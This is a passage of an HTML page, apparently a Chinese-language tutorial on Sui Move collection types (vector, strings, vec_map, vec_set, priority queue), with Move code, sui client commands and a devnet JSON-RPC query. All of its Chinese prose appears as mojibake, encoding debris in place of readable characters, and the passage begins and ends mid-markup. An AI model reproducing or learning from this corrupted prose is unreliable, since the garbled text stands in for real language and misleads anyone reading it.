class="title function_ invoke__">returns_4_values</span>(&amp;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä» Vector å¼€å§‹ï¼Œä»‹ç» Sui å’Œ Sui Framework ä¸­æ”¯æŒçš„é›†åˆç±»å‹ã€‚</p><h3><span id="shu-zu-vector">æ•°ç»„ï¼ˆVectorï¼‰</span></h3><p><code>vector&lt;T&gt;</code> æ˜¯ Move æä¾›çš„å”¯ä¸€çš„åŸç”Ÿé›†åˆç±»å‹ã€‚<code>vector&lt;T&gt;</code> æ˜¯ç”±ä¸€ç»„ç›¸åŒç±»å‹çš„å€¼ç»„æˆçš„æ•°ç»„ï¼Œæ¯”å¦‚ <code>vector&lt;u64&gt;</code>ï¼Œ <code>vector&lt;address&gt;</code> ç­‰ã€‚</p><p><code>vector</code> æ”¯æŒçš„ä¸»è¦æ“ä½œæœ‰ï¼š</p><ul><li>æœ«å°¾æ·»åŠ å…ƒç´ ï¼š<code>push_back</code></li><li>æœ«å°¾åˆ é™¤å…ƒç´ ï¼š <code>pop_back</code></li><li>è¯»å–æˆ–è€…ä¿®æ”¹ï¼š <code>borrow</code> ï¼Œ<code>borrow_mut</code></li><li>åˆ¤æ–­æ˜¯å¦åŒ…å«ï¼š <code>contains</code></li><li>äº¤æ¢å…ƒç´ ï¼š <code>swap</code></li><li>è¯»å–å…ƒç´ ç´¢å¼•ï¼š <code>index_of</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::vectors &#123;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">v</span> = vector::empty&lt;<span class="type">u64</span>&gt;();</span><br><span class="line">        vector::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> v, <span class="number">5</span>);</span><br><span class="line">        vector::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> v, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">contains</span>(&amp;<span class="keyword">mut</span> v, &amp;<span class="number">5</span>), <span class="number">42</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> (exists, index) = vector::<span class="title function_ invoke__">index_of</span>(&amp;<span class="keyword">mut</span> v, &amp;<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(exists, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(index == <span class="number">0</span>, <span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;v, <span class="number">0</span>) == <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;v, <span class="number">1</span>) == <span class="number">6</span>, <span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">        vector::<span class="title function_ invoke__">swap</span>(&amp;<span class="keyword">mut</span> v, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> v) == <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vector::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> v) == <span class="number">6</span>, <span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¹¶è¿è¡Œç¤ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¼–è¯‘å¹¶å‘å¸ƒ</span></span><br><span class="line">sui client publish . --gas-budget 300000</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ä¸Šä¸€æ­¥ç¼–è¯‘å¾—åˆ°çš„åŒ…çš„ID</span></span><br><span class="line"><span class="built_in">export</span> package_id=0xee2961ee26916285ebef57c68caaa5f67a3d8dbd</span><br><span class="line"></span><br><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> example \</span><br><span class="line">  --module vectors \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬ä»‹ç»å‡ ç§åŸºäº <code>vector</code>  çš„æ•°æ®ç±»å‹ã€‚</p><h3><span id="zi-fu-chuan-string">å­—ç¬¦ä¸²ï¼ˆStringï¼‰</span></h3><p>Move æ²¡æœ‰å­—ç¬¦ä¸²çš„åŸç”Ÿç±»å‹ï¼Œä½†å®ƒä½¿ç”¨ <code>vector&lt;u8&gt;</code> è¡¨ç¤ºå­—èŠ‚æ•°ç»„ã€‚ç›®å‰ï¼Œ <code>vector&lt;u8&gt;</code> å­—é¢é‡æœ‰ä¸¤ç§ï¼šå­—èŠ‚å­—ç¬¦ä¸²ï¼ˆbyte stringsï¼‰å’Œåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆhex stringsï¼‰ã€‚</p><p>å­—èŠ‚å­—ç¬¦ä¸²æ˜¯ä»¥ <code>b</code> ä¸ºå‰ç¼€çš„å­—ç¬¦ä¸²æ–‡å­—ï¼Œä¾‹å¦‚ <code>b&quot;Hello!\n&quot;</code>ã€‚</p><p>åå…­è¿›åˆ¶å­—ç¬¦ä¸²æ˜¯ä»¥ <code>x</code> ä¸ºå‰ç¼€çš„å­—ç¬¦ä¸²æ–‡å­—ï¼Œä¾‹å¦‚ <code>x&quot;48656C6C6F210A&quot;</code> ã€‚æ¯ä¸€å¯¹å­—èŠ‚çš„èŒƒå›´ä» <code>00</code> åˆ° <code>FF</code>ï¼Œè¡¨ç¤ºä¸€ä¸ªåå…­è¿›åˆ¶çš„ <code>u8</code>ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š <code>b&quot;Hello&quot; == x&quot;48656C6C6F&quot;</code>ã€‚</p><p>åœ¨ <code>vector&lt;u8&gt;</code> çš„åŸºç¡€ä¸Šï¼ŒMove æä¾›äº† <code>string</code> åŒ…å¤„ç† UTF8 å­—ç¬¦ä¸²çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬ä»¥åˆ›å»º Name NFT çš„ä¸ºä¾‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::strings &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;sender, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::string ä½œä¸º UTF-8 å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">use</span> std::string::&#123;<span class="keyword">Self</span>, <span class="type">String</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// ä¿å­˜ String ç±»å‹</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Name</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// String ç±»å‹</span></span><br><span class="line">        name: <span class="type">String</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">create_name</span>(</span><br><span class="line">        name_bytes: vector&lt;<span class="type">u8</span>&gt;, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): Name &#123;</span><br><span class="line">        Name &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            name: string::<span class="title function_ invoke__">utf8</span>(name_bytes)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// ä¼ å…¥åŸå§‹å­—èŠ‚ï¼ˆraw bytesï¼‰æ¥åˆ›å»º</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">issue_name_nft</span>(</span><br><span class="line">        name_bytes: vector&lt;<span class="type">u8</span>&gt;, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            <span class="title function_ invoke__">create_name</span>(name_bytes, ctx),</span><br><span class="line">            <span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åå‘½ä»¤è¡Œä¸­è°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sui client call \</span><br><span class="line">  --<span class="keyword">function</span> issue_name_nft \</span><br><span class="line">  --module strings \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --args <span class="string">&quot;my_nft&quot;</span> --gas-budget 30000</span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ¨åˆ†è¾“å‡ºç»“æœ</span></span><br><span class="line"></span><br><span class="line">----- Transaction Effects ----</span><br><span class="line">Status : Success</span><br><span class="line">Created Objects:</span><br><span class="line">  - ID: 0xf53891c8d200125bcfdba69557b158395bdf9390 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br><span class="line">Mutated Objects:</span><br><span class="line">  - ID: 0xd1de857a7a5452a73c9c176cd7c9db1b06671723 , Owner: Account Address ( 0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0 )</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ Transaction Effects ä¸­çœ‹åˆ°æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ŒID ä¸º <code>0xf53891c8d200125bcfdba69557b158395bdf9390</code>ï¼Œé€šè¿‡ Sui æä¾›çš„ RPC-API æ¥å£ <code>sui_getObject</code> å¯ä»¥çœ‹åˆ°å…¶ä¸­ä¿å­˜çš„å†…å®¹ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">curl -H &#x27;Content-Type<span class="punctuation">:</span> application/json&#x27; https<span class="punctuation">:</span><span class="comment">//fullnode.devnet.sui.io:443 -d &#x27;&#123;</span></span><br><span class="line">  <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sui_getObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span>&#x27;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Exists&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;details&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;dataType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;moveObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xee2961ee26916285ebef57c68caaa5f67a3d8dbd::strings::Name&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;has_public_transfer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my_nft&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;owner&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AddressOwner&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf28e73e59f2305edf4df88756f78fa1f5d7e78b0&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;previousTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7AfcBmJCioSbdZD6ZdYU2iUuGiSc62AuhZn7Yi3TfLDa&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;storageRebate&quot;</span><span class="punctuation">:</span> <span class="number">13</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;reference&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;objectId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xf53891c8d200125bcfdba69557b158395bdf9390&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">1614</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;digest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/SEDlnh4xXq//ZGOCZVQM5QfyR2fPzJWaYWELhrSn2o=&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="vecmap-he-vecset">VecMap å’Œ VecSet</span></h3><p>Sui åœ¨ <code>vector</code> çš„åŸºç¡€ä¸Šå®ç°äº†ä¸¤ç§æ•°æ®ç»“æ„ï¼Œæ˜ å°„ <code>vec_map</code> å’Œé›†åˆ <code>vec_set</code> ã€‚</p><p><code>vec_map</code> æ˜¯ä¸€ç§æ˜ å°„ç»“æ„ï¼Œä¿è¯ä¸åŒ…å«é‡å¤çš„é”®ï¼Œä½†æ˜¯æ¡ç›®æŒ‰ç…§æ’å…¥é¡ºåºæ’åˆ—ï¼Œè€Œä¸æ˜¯æŒ‰é”®çš„é¡ºåºã€‚æ‰€æœ‰çš„æ“ä½œæ—¶é—´å¤æ‚åº¦ä¸º <code>0(N)</code>ï¼ŒN ä¸ºæ˜ å°„çš„å¤§å°ã€‚<code>vec_map</code> åªæ˜¯ä¸ºäº†æä¾›æ–¹ä¾¿çš„æ“ä½œæ˜ å°„çš„æ¥å£ï¼Œå¦‚æœéœ€è¦ä¿å­˜å¤§å‹çš„æ˜ å°„ï¼Œæˆ–è€…æ˜¯éœ€è¦æŒ‰é”®çš„é¡ºåºæ’åºçš„æ˜ å°„éƒ½éœ€è¦å¦å¤–å¤„ç†ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¹‹åä»‹ç»çš„ <code>table</code> æ•°æ®ç»“æ„ã€‚</p><p>ä¸»è¦æ“ä½œåŒ…æ‹¬ï¼š</p><ul><li>åˆ›å»ºç©ºæ˜ å°„: <code>empty</code></li><li>æ’å…¥é”®å€¼å¯¹ï¼š <code>insert</code></li><li>è·å–é”®å¯¹åº”çš„å€¼ï¼š <code>get</code>ï¼Œ <code>get_mut</code></li><li>åˆ é™¤é”®ï¼š <code>remove</code></li><li>åˆ¤æ–­æ˜¯å¦åŒ…å«é”®ï¼š <code>contains</code></li><li>æ˜ å°„å¤§å°ï¼š <code>size</code></li><li>å°†æ˜ å°„è½¬ä¸ºé”®å€¼å¯¹çš„æ•°ç»„ï¼š <code>into_keys_values</code></li><li>è·å–æ˜ å°„é”®çš„æ•°ç»„ï¼š <code>keys</code></li><li>åˆ é™¤ç©ºæ˜ å°„ï¼š <code>destroy_empty</code></li><li>é€šè¿‡æ’å…¥çš„é¡ºåºç´¢å¼•é”®å€¼å¯¹ï¼š <code>get_entry_by_idx</code>ï¼Œ<code>get_entry_by_idx_mut</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::v_map &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::vec_map;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">m</span> = vec_map::<span class="title function_ invoke__">empty</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">v</span> = i + <span class="number">5</span>;</span><br><span class="line">            vec_map::<span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> m, k, v);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">assert!</span>(!vec_map::<span class="title function_ invoke__">is_empty</span>(&amp;m), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">size</span>(&amp;m) == <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// make sure the elements are as expected in all of the getter APIs we expose</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">contains</span>(&amp;m, &amp;k), <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">v</span> = *vec_map::<span class="title function_ invoke__">get</span>(&amp;m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(v == i + <span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(vec_map::<span class="title function_ invoke__">get_idx</span>(&amp;m, &amp;k) == i, <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">let</span> (other_k, other_v) = vec_map::<span class="title function_ invoke__">get_entry_by_idx</span>(&amp;m, i);</span><br><span class="line">            <span class="built_in">assert!</span>(*other_k == k, <span class="number">5</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*other_v == v, <span class="number">6</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// ç§»å‡ºæ‰€æœ‰å…ƒç´ </span></span><br><span class="line">        <span class="keyword">let</span> (keys, values) = vec_map::<span class="title function_ invoke__">into_keys_values</span>(copy m);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">let</span> (other_k, v) = vec_map::<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(k == other_k, <span class="number">7</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(v == i + <span class="number">5</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;keys, i) == k, <span class="number">9</span>);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;values, i) == v, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vec_set</code> ç»“æ„ä¿è¯å…¶ä¸­ä¸åŒ…å«é‡å¤çš„é”®ã€‚æ‰€æœ‰çš„æ“ä½œæ—¶é—´å¤æ‚åº¦ä¸º <code>O(N)</code>ï¼ŒN ä¸ºæ˜ å°„çš„å¤§å°ã€‚åŒæ ·ï¼Œ <code>vec_set</code> æä¾›äº†æ–¹ä¾¿çš„é›†åˆæ“ä½œæ¥å£ï¼ŒæŒ‰æ’å…¥é¡ºåºè¿›è¡Œæ’åºï¼Œå¦‚æœéœ€è¦ä½¿ç”¨æŒ‰é”®è¿›è¡Œæ’åºçš„é›†åˆï¼Œä¹Ÿéœ€è¦å¦å¤–å¤„ç†ã€‚</p><p>ä¸»è¦æ“ä½œåŒ…æ‹¬ï¼š</p><ul><li>åˆ›å»ºç©ºé›†åˆ: <code>empty</code></li><li>æ’å…¥å…ƒç´ ï¼š <code>insert</code></li><li>åˆ é™¤å…ƒç´ ï¼š <code>remove</code></li><li>åˆ¤æ–­æ˜¯å¦åŒ…å«å…ƒç´ ï¼š <code>contains</code></li><li>é›†åˆå¤§å°ï¼š <code>size</code></li><li>å°†é›†åˆè½¬ä¸ºå…ƒç´ çš„æ•°ç»„ï¼š <code>into_keys</code></li></ul><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::v_set &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::vec_set;</span><br><span class="line">    <span class="keyword">use</span> std::vector;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">m</span> = vec_set::<span class="title function_ invoke__">empty</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            vec_set::<span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> m, k);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">assert!</span>(!vec_set::<span class="title function_ invoke__">is_empty</span>(&amp;m), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(vec_set::<span class="title function_ invoke__">size</span>(&amp;m) == <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// make sure the elements are as expected in all of the getter APIs we expose</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            <span class="built_in">assert!</span>(vec_set::<span class="title function_ invoke__">contains</span>(&amp;m, &amp;k), <span class="number">2</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// ç§»å‡ºæ‰€æœ‰å…ƒç´ </span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">keys</span> = vec_set::<span class="title function_ invoke__">into_keys</span>(copy m);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">k</span> = i + <span class="number">2</span>;</span><br><span class="line">            vec_set::<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> m, &amp;k);</span><br><span class="line">            <span class="built_in">assert!</span>(*vector::<span class="title function_ invoke__">borrow</span>(&amp;keys, i) == k, <span class="number">9</span>);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="you-xian-dui-lie-priorityqueue">ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆPriorityQueueï¼‰</span></h3><p>è¿˜æœ‰ä¸€ç§åŸºäº <code>vector</code> æ„å»ºçš„æ•°æ®ç»“æ„ï¼šä¼˜å…ˆé˜Ÿåˆ—ï¼Œä»–ä½¿ç”¨åŸºäº <code>vector</code> å®ç°çš„å¤§é¡¶å †ï¼ˆmax heapï¼‰æ¥å®ç°ã€‚</p><p>å¤§é¡¶å †æ˜¯ä¸€ç§äºŒå‰æ ‘ç»“æ„ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å¤§äºæˆ–ç­‰äºå…¶å·¦å³å­©å­èŠ‚ç‚¹çš„å€¼ï¼Œè¿™æ ·ï¼Œè¿™ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹å§‹ç»ˆéƒ½æ˜¯æ‰€æœ‰èŠ‚ç‚¹ä¸­å€¼æœ€å¤§çš„èŠ‚ç‚¹ã€‚</p><p>åœ¨ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸€ä¸ªèŠ‚ç‚¹èµ‹äºˆä¸€ä¸ªæƒé‡ï¼Œæˆ‘ä»¬åŸºäºæƒé‡æ„å»ºä¸€ä¸ªå¤§é¡¶å †ï¼Œä»å¤§é¡¶å †é¡¶éƒ¨å¼¹å‡ºæ ¹èŠ‚ç‚¹åˆ™ä¸ºæƒé‡æœ€å¤§çš„èŠ‚ç‚¹ã€‚è¿™æ ·å°±å½¢æˆè¿‡äº†ä¸€ä¸ªæŒ‰ä¼˜å…ˆçº§å¼¹å‡ºçš„é˜Ÿåˆ—ã€‚</p><p>ä¼˜å…ˆé˜Ÿåˆ—ä¸»è¦åŒ…å«çš„æ“ä½œä¸ºï¼š</p><ul><li>åˆ›å»ºæ¡ç›®åˆ—è¡¨ï¼š <code>create_entries</code> ï¼Œç»“æœä½œä¸º <code>new</code> æ–¹æ³•å‚æ•°</li><li>åˆ›å»ºï¼š <code>new</code></li><li>æ’å…¥ï¼š <code>insert</code></li><li>å¼¹å‡ºæœ€å¤§ï¼š <code>pop_max</code></li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::pq &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::priority_queue::&#123;PriorityQueue, pop_max, create_entries, new, insert&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// æ£€æŸ¥å¼¹å‡ºçš„æœ€å¤§å€¼åŠå…¶æƒé‡</span></span><br><span class="line">    fun <span class="title function_ invoke__">check_pop_max</span>(h: &amp;<span class="keyword">mut</span> PriorityQueue&lt;<span class="type">u64</span>&gt;, expected_priority: <span class="type">u64</span>, expected_value: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> (priority, value) = <span class="title function_ invoke__">pop_max</span>(h);</span><br><span class="line">        <span class="built_in">assert!</span>(priority == expected_priority, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(value == expected_value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">new</span>(<span class="title function_ invoke__">create_entries</span>(vector[<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>], vector[<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">60</span>]));</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">5</span>, <span class="number">50</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">4</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span class="number">3</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="title function_ invoke__">insert</span>(&amp;<span class="keyword">mut</span> h, <span class="number">7</span>, <span class="number">70</span>);</span><br><span class="line">        <span class="title function_ invoke__">check_pop_max</span>(&amp;<span class="keyword">mut</span> h, <span 